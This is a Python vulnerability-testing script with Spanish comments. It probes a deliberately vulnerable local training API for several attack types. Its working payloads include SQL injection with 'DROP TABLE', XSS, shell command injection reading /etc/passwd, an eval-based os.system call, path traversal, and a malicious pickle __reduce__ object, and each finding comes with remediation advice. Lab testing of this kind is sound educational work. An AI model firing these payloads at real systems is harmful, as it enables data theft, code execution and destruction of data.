#  Tester  para la API vulnerable
import requests
import json
import time
import base64
import pickle
import subprocess
from datetime import datetime
from typing import Dict, List, Any
from dataclasses import dataclass

@dataclass
class VulnerabilityTest:
    """Resultado de un test de vulnerabilidad"""
    name: str
    vulnerability_type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    payload: Any
    response_status: int
    response_data: Dict
    vulnerable: bool
    evidence: str
    recommendation: str

class VulnerableAPITester:
    """Tester especializado para detectar vulnerabilidades en la API"""
    
    def __init__(self, base_url: str = "http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[VulnerabilityTest] = []
        
        # Headers básicos
        self.session.headers.update({
            'User-Agent': 'Security-Tester/1.0',
            'Content-Type': 'application/json'
        })

    def test_all_vulnerabilities(self):
        """Ejecuta todos los tests de vulnerabilidades"""
        print("🎯 INICIANDO TESTS DE VULNERABILIDADES EN API")
        print("=" * 60)
        
        # Verificar que la API esté disponible
        if not self._check_api_availability():
            print("❌ API no disponible. Asegúrate de ejecutar 'python vulnerable_api.py'")
            return
        
        # Tests de autenticación
        print("\n🔐 TESTS DE AUTENTICACIÓN")
        self._test_sql_injection_login()
        self._test_authentication_bypass()
        self._test_privilege_escalation()
        
        # Tests de inyección SQL
        print("\n💉 TESTS DE INYECCIÓN SQL")
        self._test_sql_injection_in_search()
        self._test_sql_injection_in_list()
        self._test_sql_injection_in_details()
        
        # Tests de XSS
        print("\n🌐 TESTS DE CROSS-SITE SCRIPTING (XSS)")
        self._test_reflected_xss()
        self._test_stored_xss()
        
        # Tests de IDOR
        print("\n🔍 TESTS DE INSECURE DIRECT OBJECT REFERENCE (IDOR)")
        self._test_idor_vulnerabilities()
        
        # Tests de inyección de comandos
        print("\n⚡ TESTS DE INYECCIÓN DE COMANDOS")
        self._test_command_injection()
        self._test_code_execution()
        
        # Tests de path traversal
        print("\n📁 TESTS DE PATH TRAVERSAL")
        self._test_path_traversal()
        
        # Tests de deserialización insegura
        print("\n🔓 TESTS DE DESERIALIZACIÓN INSEGURA")
        self._test_pickle_deserialization()
        
        # Tests de disclosure de información
        print("\n📊 TESTS DE INFORMATION DISCLOSURE")
        self._test_information_disclosure()
        
        # Generar reporte
        self._generate_vulnerability_report()

    def _check_api_availability(self) -> bool:
        """Verifica si la API está disponible"""
        try:
            response = self.session.get(f"{self.base_url}/")
            return response.status_code == 200
        except:
            return False

    def _test_sql_injection_login(self):
        """Test de SQL injection en login"""
        # Payload clásico de bypass de autenticación
        payloads = [
            {"username": "admin' OR '1'='1' --", "password": "anything"},
            {"username": "admin'/*", "password": "*/OR/**/1=1#"},
            {"username": "' UNION SELECT 1,2,3,4,5,6,7,8 --", "password": "test"},
            {"username": "admin'; DROP TABLE students; --", "password": "test"}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(f"{self.base_url}/api/login", json=payload)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success', False):
                        vulnerable = True
                        evidence = f"Login exitoso con payload SQL: {payload['username']}"
                    elif 'syntax error' in str(data).lower() or 'sql' in str(data).lower():
                        vulnerable = True
                        evidence = f"Error SQL expuesto: {data.get('error', '')}"
                
                self.results.append(VulnerabilityTest(
                    name=f"SQL Injection Login: {payload['username'][:30]}...",
                    vulnerability_type="SQL_INJECTION",
                    severity="CRITICAL",
                    payload=payload,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Usar consultas parametrizadas y validación de entrada"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: SQL Injection en login")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_authentication_bypass(self):
        """Test de bypass de autenticación"""
        # Intentar acceder al panel de admin sin autenticación
        bypass_attempts = [
            {"url": "/api/admin?admin=true", "method": "GET"},
            {"url": "/api/admin", "method": "GET", "headers": {"X-Admin-Access": "granted"}},
            {"url": "/api/admin", "method": "GET", "headers": {"Authorization": "Bearer admin"}}
        ]
        
        for attempt in bypass_attempts:
            try:
                headers = attempt.get('headers', {})
                if attempt['method'] == 'GET':
                    response = self.session.get(f"{self.base_url}{attempt['url']}", headers=headers)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('admin_panel', False):
                        vulnerable = True
                        evidence = f"Acceso a panel admin sin autenticación válida"
                
                self.results.append(VulnerabilityTest(
                    name=f"Auth Bypass: {attempt['url']}",
                    vulnerability_type="AUTHENTICATION_BYPASS",
                    severity="HIGH",
                    payload=attempt,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Implementar autenticación robusta y verificación de sesión"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Bypass de autenticación")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_privilege_escalation(self):
        """Test de escalación de privilegios"""
        # Intentar registrarse como admin
        payload = {
            "nombre": "testuser",
            "apellido": "hacker",
            "curso": "Security",
            "nivel": "L5",
            "password": "test123",
            "email": "test@test.com",
            "admin": 1  # Intentar escalación
        }
        
        try:
            response = self.session.post(f"{self.base_url}/api/register", json=payload)
            
            vulnerable = False
            evidence = ""
            
            if response.status_code == 200:
                data = response.json()
                if data.get('admin_granted', False):
                    vulnerable = True
                    evidence = f"Escalación de privilegios exitosa en registro"
            
            self.results.append(VulnerabilityTest(
                name="Privilege Escalation in Registration",
                vulnerability_type="PRIVILEGE_ESCALATION",
                severity="HIGH",
                payload=payload,
                response_status=response.status_code,
                response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                vulnerable=vulnerable,
                evidence=evidence,
                recommendation="Validar permisos en el servidor y no confiar en datos del cliente"
            ))
            
            print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Escalación de privilegios")
            
        except Exception as e:
            print(f"   ⚠️ Error en test: {str(e)}")

    def _test_sql_injection_in_search(self):
        """Test de SQL injection en búsqueda de estudiantes"""
        sql_payloads = [
            "' UNION SELECT 1,2,3,4,5,6,7,8 --",
            "'; DROP TABLE students; --",
            "' OR 1=1 --",
            "' UNION SELECT name,password,null,null,null,null,null,null FROM sqlite_master --"
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.get(f"{self.base_url}/api/students?search={payload}")
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Verificar si hay indicios de SQL injection exitosa
                    if data.get('success') and 'query_executed' in data:
                        query = data['query_executed']
                        if 'UNION' in query or 'OR 1=1' in query:
                            vulnerable = True
                            evidence = f"SQL injection exitosa: {query}"
                    
                    # Verificar si devuelve datos inesperados
                    students = data.get('students', [])
                    if len(students) > 10:  # Muchos resultados pueden indicar bypass
                        vulnerable = True
                        evidence = f"Posible bypass SQL - {len(students)} resultados"
                
                elif 'syntax error' in response.text.lower() or 'sql' in response.text.lower():
                    vulnerable = True
                    evidence = f"Error SQL expuesto en response"
                
                self.results.append(VulnerabilityTest(
                    name=f"SQL Injection in Search: {payload[:30]}...",
                    vulnerability_type="SQL_INJECTION",
                    severity="CRITICAL",
                    payload={"search": payload},
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Usar consultas parametrizadas para filtros de búsqueda"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: SQL Injection en búsqueda")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_sql_injection_in_list(self):
        """Test de SQL injection en listado con parámetros order_by y limit"""
        injection_params = [
            {"order_by": "id; DROP TABLE students; --"},
            {"order_by": "(SELECT CASE WHEN (1=1) THEN id ELSE 1/0 END)"},
            {"limit": "1 UNION SELECT password,null,null,null,null,null,null,null FROM students WHERE admin=1--"}
        ]
        
        for params in injection_params:
            try:
                response = self.session.get(f"{self.base_url}/api/students", params=params)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if 'query_executed' in data:
                        query = data['query_executed']
                        if any(keyword in query.upper() for keyword in ['DROP', 'UNION', 'SELECT']):
                            vulnerable = True
                            evidence = f"Parámetros SQL inyectados en query: {query}"
                
                self.results.append(VulnerabilityTest(
                    name=f"SQL Injection in Parameters: {list(params.keys())[0]}",
                    vulnerability_type="SQL_INJECTION",
                    severity="HIGH",
                    payload=params,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Validar y sanitizar todos los parámetros de query"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: SQL Injection en parámetros")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_sql_injection_in_details(self):
        """Test de SQL injection en endpoint de detalles de estudiante"""
        injection_ids = [
            "1 UNION SELECT 1,username,password,null,null,null,null,null FROM admin_users--",
            "1; DROP TABLE students; --",
            "1 OR 1=1",
            "-1 UNION SELECT 1,2,3,4,5,6,7,8--"
        ]
        
        for student_id in injection_ids:
            try:
                response = self.session.get(f"{self.base_url}/api/students/{student_id}")
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success') and 'student' in data:
                        # Si devuelve datos con ID manipulado, es vulnerable
                        vulnerable = True
                        evidence = f"SQL injection en ID permitió acceso a datos"
                elif 'syntax error' in response.text.lower():
                    vulnerable = True
                    evidence = "Error de sintaxis SQL expuesto"
                
                self.results.append(VulnerabilityTest(
                    name=f"SQL Injection in Student ID: {student_id}",
                    vulnerability_type="SQL_INJECTION",
                    severity="HIGH",
                    payload={"student_id": student_id},
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Validar tipos de datos y usar consultas parametrizadas"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: SQL Injection en ID")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_reflected_xss(self):
        """Test de XSS reflejado"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            try:
                # Test en búsqueda
                search_payload = {"query": payload}
                response = self.session.post(f"{self.base_url}/api/search", json=search_payload)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    html_content = data.get('html', '')
                    
                    # Verificar si el payload XSS está presente sin escapar
                    if payload in html_content and not any(escaped in html_content for escaped in ['&lt;', '&gt;', '&amp;']):
                        vulnerable = True
                        evidence = f"XSS payload reflejado sin escapar en HTML: {payload}"
                
                self.results.append(VulnerabilityTest(
                    name=f"Reflected XSS: {payload[:30]}...",
                    vulnerability_type="XSS_REFLECTED",
                    severity="HIGH",
                    payload=search_payload,
                    response_status=response.status_code,
                    response_data=data if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Escapar todos los datos de usuario en output HTML"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: XSS Reflejado")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_stored_xss(self):
        """Test de XSS almacenado"""
        xss_payloads = [
            "<script>alert('Stored XSS')</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "javascript:alert('Stored XSS')"
        ]
        
        for payload in xss_payloads:
            try:
                # Crear estudiante con payload XSS
                student_data = {
                    "nombre": payload,
                    "apellido": "TestXSS",
                    "curso": "Security Testing",
                    "nivel": "L5"
                }
                
                response = self.session.post(f"{self.base_url}/api/students", json=student_data)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success'):
                        student_id = data.get('student', {}).get('id')
                        
                        # Verificar si el payload se almacenó sin sanitizar
                        if payload in str(data.get('student', {})):
                            vulnerable = True
                            evidence = f"XSS payload almacenado sin sanitizar: {payload}"
                        
                        # Intentar recuperar el estudiante para verificar persistencia
                        if student_id:
                            get_response = self.session.get(f"{self.base_url}/api/students/{student_id}")
                            if get_response.status_code == 200:
                                get_data = get_response.json()
                                if payload in str(get_data.get('student', {})):
                                    vulnerable = True
                                    evidence = f"XSS payload persistente en base de datos"
                
                self.results.append(VulnerabilityTest(
                    name=f"Stored XSS: {payload[:30]}...",
                    vulnerability_type="XSS_STORED",
                    severity="HIGH",
                    payload=student_data,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Sanitizar entrada antes de almacenar y escapar output"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: XSS Almacenado")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_idor_vulnerabilities(self):
        """Test de vulnerabilidades IDOR (Insecure Direct Object Reference)"""
        # Intentar acceder a diferentes IDs sin autorización
        test_ids = [1, 2, 3, 999, -1, 0]
        
        for test_id in test_ids:
            try:
                response = self.session.get(f"{self.base_url}/api/students/{test_id}")
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success') and 'student' in data:
                        student = data['student']
                        # Si devuelve datos sensibles sin autorización
                        if 'password' in student or 'email' in student:
                            vulnerable = True
                            evidence = f"Acceso no autorizado a datos sensibles del estudiante ID {test_id}"
                
                self.results.append(VulnerabilityTest(
                    name=f"IDOR Access to Student ID {test_id}",
                    vulnerability_type="IDOR",
                    severity="MEDIUM",
                    payload={"student_id": test_id},
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Implementar control de acceso y autorización por recurso"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: IDOR para ID {test_id}")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_command_injection(self):
        """Test de inyección de comandos"""
        command_payloads = [
            "ls -la",
            "id",
            "cat /etc/passwd",
            "whoami",
            "pwd",
            "ps aux"
        ]
        
        for payload in command_payloads:
            try:
                command_data = {"command": payload}
                response = self.session.post(f"{self.base_url}/api/execute", json=command_data)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success') and 'output' in data:
                        vulnerable = True
                        evidence = f"Comando ejecutado exitosamente: {payload}"
                        output = data.get('output', '')[:100]  # Primeros 100 caracteres
                        evidence += f" - Output: {output}"
                
                self.results.append(VulnerabilityTest(
                    name=f"Command Injection: {payload}",
                    vulnerability_type="COMMAND_INJECTION",
                    severity="CRITICAL",
                    payload=command_data,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Nunca ejecutar comandos basados en entrada de usuario"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Command Injection")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_code_execution(self):
        """Test de ejecución de código"""
        code_payloads = [
            "eval:1+1",
            "eval:__import__('os').system('id')",
            "eval:open('/etc/passwd').read()",
            "eval:print('Code execution successful')"
        ]
        
        for payload in code_payloads:
            try:
                search_data = {"query": payload}
                response = self.session.post(f"{self.base_url}/api/search", json=search_data)
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json()
                    if 'eval_result' in data:
                        vulnerable = True
                        evidence = f"Código Python ejecutado: {payload} - Resultado: {data['eval_result']}"
                
                self.results.append(VulnerabilityTest(
                    name=f"Code Execution: {payload[:30]}...",
                    vulnerability_type="CODE_EXECUTION",
                    severity="CRITICAL",
                    payload=search_data,
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Nunca usar eval() con entrada de usuario"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Code Execution")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_path_traversal(self):
        """Test de path traversal"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "config.ini",
            "database.conf"
        ]
        
        for payload in traversal_payloads:
            try:
                response = self.session.get(f"{self.base_url}/api/files/{payload}")
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    response_text = response.text
                    # Verificar si devuelve contenido de archivos del sistema
                    if any(indicator in response_text for indicator in ['root:', 'www-data:', 'database_password', 'api_key']):
                        vulnerable = True
                        evidence = f"Path traversal exitoso - Acceso a archivo: {payload}"
                
                self.results.append(VulnerabilityTest(
                    name=f"Path Traversal: {payload}",
                    vulnerability_type="PATH_TRAVERSAL",
                    severity="HIGH",
                    payload={"filename": payload},
                    response_status=response.status_code,
                    response_data={"response_preview": response.text[:200]} if response.text else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Validar y sanitizar rutas de archivos, usar whitelist"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Path Traversal")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _test_pickle_deserialization(self):
        """Test de deserialización insegura con pickle"""
        try:
            # Crear un payload malicioso con pickle
            class MaliciousPayload:
                def __reduce__(self):
                    import os
                    return (os.system, ('echo "Pickle deserialization successful"',))
            
            malicious_obj = MaliciousPayload()
            pickled_data = pickle.dumps(malicious_obj)
            encoded_payload = base64.b64encode(pickled_data).decode()
            
            upload_data = {
                "filename": "malicious.pickle",
                "content": encoded_payload
            }
            
            response = self.session.post(f"{self.base_url}/api/upload", json=upload_data)
            
            vulnerable = False
            evidence = ""
            
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'deserializado' in data.get('message', ''):
                    vulnerable = True
                    evidence = "Deserialización insegura de pickle ejecutada"
            
            self.results.append(VulnerabilityTest(
                name="Unsafe Pickle Deserialization",
                vulnerability_type="UNSAFE_DESERIALIZATION",
                severity="CRITICAL",
                payload=upload_data,
                response_status=response.status_code,
                response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                vulnerable=vulnerable,
                evidence=evidence,
                recommendation="Nunca deserializar datos no confiables, usar JSON en su lugar"
            ))
            
            print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Unsafe Deserialization")
            
        except Exception as e:
            print(f"   ⚠️ Error en test: {str(e)}")

    def _test_information_disclosure(self):
        """Test de revelación de información sensible"""
        disclosure_endpoints = [
            "/api/debug",
            "/api/admin",
            "/nonexistent"  # Para probar error handling
        ]
        
        for endpoint in disclosure_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                vulnerable = False
                evidence = ""
                
                if response.status_code == 200:
                    data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    # Verificar información sensible expuesta
                    sensitive_info = [
                        'secret_key', 'password', 'environment_variables', 
                        'database_file', 'traceback', 'locals'
                    ]
                    
                    for info_type in sensitive_info:
                        if info_type in str(data):
                            vulnerable = True
                            evidence = f"Información sensible expuesta: {info_type}"
                            break
                
                elif response.status_code in [404, 500]:
                    # Verificar si errores exponen información
                    if 'traceback' in response.text or 'locals' in response.text:
                        vulnerable = True
                        evidence = f"Error {response.status_code} expone información del sistema"
                
                self.results.append(VulnerabilityTest(
                    name=f"Information Disclosure: {endpoint}",
                    vulnerability_type="INFORMATION_DISCLOSURE",
                    severity="MEDIUM",
                    payload={"endpoint": endpoint},
                    response_status=response.status_code,
                    response_data=response.json() if response.headers.get('content-type', '').startswith('application/json') else {},
                    vulnerable=vulnerable,
                    evidence=evidence,
                    recommendation="Configurar manejo seguro de errores y remover endpoints de debug"
                ))
                
                print(f"   {'🚨 VULNERABLE' if vulnerable else '✅ SEGURO'}: Information Disclosure")
                
            except Exception as e:
                print(f"   ⚠️ Error en test: {str(e)}")

    def _generate_vulnerability_report(self):
        """Genera reporte completo de vulnerabilidades encontradas"""
        print("\n" + "="*80)
        print("📊 REPORTE DE VULNERABILIDADES DETECTADAS")
        print("="*80)
        
        # Contadores por severidad
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        total_vulnerabilities = 0
        
        for result in self.results:
            if result.vulnerable:
                severity_counts[result.severity] += 1
                total_vulnerabilities += 1
        
        print(f"🎯 Total de tests ejecutados: {len(self.results)}")
        print(f"🚨 Vulnerabilidades encontradas: {total_vulnerabilities}")
        print(f"🔴 Críticas: {severity_counts['CRITICAL']}")
        print(f"🟠 Altas: {severity_counts['HIGH']}")
        print(f"🟡 Medias: {severity_counts['MEDIUM']}")
        print(f"🔵 Bajas: {severity_counts['LOW']}")
        
        # Mostrar vulnerabilidades críticas
        critical_vulns = [r for r in self.results if r.vulnerable and r.severity == "CRITICAL"]
        if critical_vulns:
            print(f"\n🔴 VULNERABILIDADES CRÍTICAS ENCONTRADAS:")
            for vuln in critical_vulns:
                print(f"   • {vuln.name}")
                print(f"     Evidencia: {vuln.evidence}")
                print(f"     Recomendación: {vuln.recommendation}")
                print()
        
        # Determinar nivel de riesgo general
        if severity_counts["CRITICAL"] > 0:
            risk_level = "🔴 CRÍTICO"
        elif severity_counts["HIGH"] > 2:
            risk_level = "🟠 ALTO"
        elif severity_counts["MEDIUM"] > 5:
            risk_level = "🟡 MEDIO"
        else:
            risk_level = "🟢 BAJO"
        
        print(f"⚠️ NIVEL DE RIESGO GENERAL: {risk_level}")
        
        # Exportar reporte detallado
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "total_tests": len(self.results),
            "total_vulnerabilities": total_vulnerabilities,
            "severity_breakdown": severity_counts,
            "risk_level": risk_level,
            "vulnerabilities": [
                {
                    "name": r.name,
                    "type": r.vulnerability_type,
                    "severity": r.severity,
                    "vulnerable": r.vulnerable,
                    "evidence": r.evidence,
                    "recommendation": r.recommendation,
                    "payload": r.payload,
                    "response_status": r.response_status
                } for r in self.results if r.vulnerable
            ]
        }
        
        filename = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"\n📄 Reporte detallado exportado a: {filename}")
        print("="*80)

def main():
    """Función principal para ejecutar todos los tests"""
    print("🚨 TESTER DE VULNERABILIDADES PARA API INSEGURA")
    print("=" * 60)
    print("⚠️  Este script testea vulnerabilidades incluidas")
    print("📚  Detección de Superficies de Ataque")
    print("=" * 60)
    
    tester = VulnerableAPITester()
    
    try:
        tester.test_all_vulnerabilities()
        print("\n✅ Tests de vulnerabilidades completados")
        print("💡 Revisa el reporte generado para ver los detalles")
        
    except KeyboardInterrupt:
        print("\n⚠️ Tests interrumpidos por el usuario")
    except Exception as e:
        print(f"\n❌ Error durante la ejecución: {str(e)}")

if __name__ == "__main__":
    main()
